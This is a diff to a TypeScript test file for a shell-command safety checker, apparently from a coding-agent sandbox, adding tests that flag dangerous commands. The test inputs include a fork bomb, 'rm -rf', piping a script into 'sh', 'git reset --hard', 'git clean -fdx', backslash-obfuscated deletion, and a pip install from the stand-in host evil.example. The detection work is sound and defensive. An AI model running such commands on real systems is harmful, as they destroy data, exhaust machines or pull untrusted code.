@@ -1,6 +1,6 @@
 import { describe, it } from 'node:test'
 import assert from 'node:assert/strict'
-import { analyzeShellCommand } from './shell-scope.ts'
+import { analyzeShellCommand, dangerousInSandboxReasons } from './shell-scope.ts'
 
 describe('analyzeShellCommand', () => {
   const root = '/Users/me/project'
@@ -111,5 +111,40 @@ describe('analyzeShellCommand', () => {
     const pipr = analyzeShellCommand('pip install foo --index-url https://evil.example', root)
     assert.equal(pipr.verdict, 'external')
     assert.ok(pipr.reasons.some((x) => /custom pip index/.test(x)))
+  })
+})
+
+describe('dangerousInSandboxReasons', () => {
+  it('flags rm -rf even though it stays in the workspace', () => {
+    const reasons = dangerousInSandboxReasons('rm -rf node_modules')
+    assert.ok(reasons.some((r) => r.includes('recursive/forced delete')))
+  })
+
+  it('flags piping into a shell interpreter', () => {
+    const reasons = dangerousInSandboxReasons('cat setup.sh | sh')
+    assert.ok(reasons.some((r) => r.includes('piping output')))
+  })
+
+  it('flags fork bombs and unbounded loops', () => {
+    assert.ok(dangerousInSandboxReasons(':(){ :|:& };:').some((r) => r.includes('fork bomb')))
+    assert.ok(
+      dangerousInSandboxReasons('while true; do echo x; done').some((r) =>
+        r.includes('unbounded loop'),
+      ),
+    )
+  })
+
+  it('flags git reset --hard / git clean', () => {
+    assert.ok(dangerousInSandboxReasons('git reset --hard HEAD~3').length > 0)
+    assert.ok(dangerousInSandboxReasons('git clean -fdx').length > 0)
+  })
+
+  it('does not flag ordinary build/test commands', () => {
+    assert.deepEqual(dangerousInSandboxReasons('npm test -- --coverage'), [])
+    assert.deepEqual(dangerousInSandboxReasons('ls -la src'), [])
+  })
+
+  it('sees through backslash obfuscation', () => {
+    assert.ok(dangerousInSandboxReasons('r\\m -rf build').length > 0)
   })
 })
